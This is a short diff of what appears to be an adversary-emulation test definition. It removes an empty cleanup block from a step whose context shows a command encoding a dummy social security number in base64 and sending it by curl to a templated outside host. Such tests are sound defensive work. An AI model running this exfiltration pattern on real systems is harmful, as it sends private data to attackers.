@@ -27,6 +27,3 @@ steps:
         echo -n 111-11-1111 | base64
         curl -XPOST {{.Args.base64_data}}.{{.Args.destination_url}}
       executor: sh
-      cleanup:
-        inline: ""
-        executor: sh
